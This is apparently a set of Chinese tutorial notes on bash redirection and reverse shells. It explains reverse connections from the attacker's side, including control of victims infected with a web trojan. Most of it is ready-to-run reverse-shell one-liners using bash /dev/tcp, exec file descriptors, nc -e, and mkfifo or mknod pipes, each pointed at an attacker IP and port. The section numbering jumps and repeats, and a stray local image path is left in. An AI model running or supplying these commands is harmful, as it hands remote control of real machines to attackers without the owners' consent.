### **4.文件描述符的复制**

格式： [n]<&[m] / [n]>&[m] **(这里所有字符之间不要有空格)**

说明：

1）这里两个**都是将文件描述符 n 复制到 m** ，两者的区别是，前者是以只读的形式打开，后者是以写的形式打开

**因此 0<&1 和 0>&1 是完全等价的（读/写方式打开对其没有任何影响）**

2）这里的& 目的是为了区分数字名字的文件和文件描述符，如果没有& 系统会认为是将文件描述符重定向到了一个数字作为文件名的文件，而不是一个文件描述符

### 5.exec 绑定重定向**

格式：exec [n] </> file/[n]

上面的输入输出重定向将输入和输出绑定文件或者设备以后只对当前的那条指令有效，如果需要接下来的指令都支持的话就需要使用 exec 指令

### **重点：**

格式： [n]<>word

说明：以读写方式打开word指代的文件，并将n重定向到该文件。如果n不指定的话，默认为标准输入。

![1580918960873](C:\Users\Paul C\AppData\Roaming\Typora\typora-user-images\1580918960873.png)



## **0X01 什么是反弹shell**

reverse shell，就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell与telnet，ssh等标准shell对应，本质上是网络概念的客户端与服务端的角色反转。

## **0X02 为什么要反弹shell**

通常用于被控端因防火墙受限、权限不足、端口被占用等情形

假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面，web服务，ssh，telnet等等，都是正向连接。那么什么情况下正向连接不太好用了呢？

1.某客户机中了你的网马，但是它在局域网内，你直接连接不了。

2.它的ip会动态改变，你不能持续控制。

3.由于防火墙等限制，对方机器只能发送请求，不能接收请求。

4.对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知，所以建立一个服务端，让恶意程序主动连接，才是上策。

那么反弹就很好理解了， 攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，就叫反弹连接。

**4. >&、&>**

这个符号作用就是混合输出（错误、正确输出都输出到一个地方）

```
bash -i >& /dev/tcp/192.168.146.129/2333 0>&1
等价于
bash -i > /dev/tcp/192.168.146.129/2333 0>&1 2>&1
```

### **3.方法三**

```
exec 5<>/dev/tcp/192.168.146.129/2333;cat <&5|while read line;do $line >&5 2>&1;done
```

```
0<&196;exec 196<>/dev/tcp/attackerip/4444; sh <&196 >&196 2>&196
```

### **4.方法四**

nc 如果安装了正确的版本（存在-e 选项就能直接反弹shell）

```
nc -e /bin/sh 192.168.146.129 2333
```

但是如果是没有-e 选项是不是就不能实现了呢？当然不是，我们可以向下面这样

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.146.129 2333 >/tmp/f
```

**简单的解释：**

mkfifo 命令首先创建了一个管道，cat 将管道里面的内容输出传递给/bin/sh，sh会执行管道里的命令并将标准输出和标准错误输出结果通过nc 传到该管道，由此形成了一个回路

类似的命令：

```
mknod backpipe p; nc 192.168.146.129 2333 0<backpipe | /bin/bash 1>backpipe 2>backpipe
```